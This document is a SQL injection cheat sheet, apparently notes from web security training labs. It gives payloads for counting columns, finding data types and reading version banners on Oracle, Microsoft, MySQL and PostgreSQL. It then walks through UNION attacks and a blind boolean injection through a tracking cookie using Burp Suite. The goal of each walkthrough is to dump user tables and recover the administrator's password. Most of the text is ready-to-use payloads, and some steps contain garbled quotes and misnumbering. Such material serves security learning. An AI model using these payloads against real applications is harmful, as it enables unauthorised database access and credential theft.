<h2>SQL Injection(SQLi) ATTACK </h2>

<b>SQL Attack queries to determine the number of COLUMNS, DATATYPES of the columns and VERSION on Oracle, Microsoft, MySQL and PostgreSQL</b>

| Database | Columns Query | Datatypes | Version |
|----------|---------------|-----------|---------|
| Oracle |  ‘ ORDER BY 1-- </br> ‘ ORDER BY 3-- </br> In this example: 3 - 1 = 2(no. of columns) | ‘ UNION SELECT ‘a’ , ‘a’ FROM DUAL-- | ‘ UNION SELECT banner, NULL FROM v$version-- </br> SELECT banner FROM v$version |  
| Microsoft | same as Oracle | ‘ UNION SELECT ‘a’ , ‘a’-- | SELECT @@version | 
| MySQL | ‘ ORDER BY 1# | ‘ UNION SELECT ‘a’ , ‘a’# | SELECT @@version </br> ‘ UNION SELECT @@version, ‘a’#|
| PostgreSQL | same as Oracle | ‘ UNION SELECT ‘a’ , ‘a’-- | SELECT version() |

<b>SQLi Attack, listing the database contents on Oracle</b>
</br>
1. Use [Burp Suite](https://portswigger.net/burp/communitydownload) to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:  '+UNION+SELECT+'abc','def'+FROM+dual--
3. Use the following payload to retrieve the list of tables in the database:  '+UNION+SELECT+table_name,NULL+FROM+all_tables--
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:  '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:  '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
8. Find the password for the administrator user, and use it to log in.
</br>

<b>SQLi UNION attack, finding a column containing text</b>
</br>
1. Use Burp Suite to intercept and modify the request that sets the product category filter. </br>
2. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:  '+UNION+SELECT+NULL,NULL,NULL-- </br>
3. Try replacing each null with the random value, for example:  '+UNION+SELECT+'abcdef',NULL,NULL-- </br>
4. If an error occurs, move on to the next null and try that instead.
</br>

<b>Blind SQL injection with conditional responses</b>

1. Modify the TrackingId cookie, changing it to:</br>
2. TrackingId=xyz' AND '1'='1</br>
 Verify that the "Welcome back" message appears in the response.</br>
3. Now change it to:</br>
TrackingId=xyz' AND '1'='2</br>
Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
</br>
4. Now:</br>
Confirm that there is a table called users.</br>
‘ AND (SELECT ‘a’ FROM users LIMIT 1)=‘a</br>
Verify that the condition is true, confirming that there is a table called users.</br>

5. Confirm that there is a user called administrator.</br>
‘ AND (SELECT ‘a’ FROM users WHERE username=‘administrator’)=‘a</br>
Verify that the condition is true, confirming that there is a user called administrator.</br>

6. Determine the length of the password in the administrator user.</br>
To do that: ‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>1)=‘a</br>
This condition should be true, confirming that the password is greater than 1 character in length.</br>

7. Send a series of follow-up values to test different password lengths. Send</br>
‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>2)=‘a </br>
8. Then send:</br>
‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>3)=‘a </br>
We can so this by manually by using Burp Repeater.</br>
OR can do automatically by using Burp Intruder.</br>
9. In Burp Intruder:</br>
Choose Payload Type: Numbers</br>
Change payload settings with Number range </br>
From 1 to 25 and step 1</br>
Place payload position markers around the final a character in the cookie value. To do this, select just the 1, and click the "Add §" button. </br>
‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>§1§)=‘a</br>

10. Next:</br>
Change the value of cookie in the position tab of the Burp Intruder. </br>
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a </br>
This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

11. Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
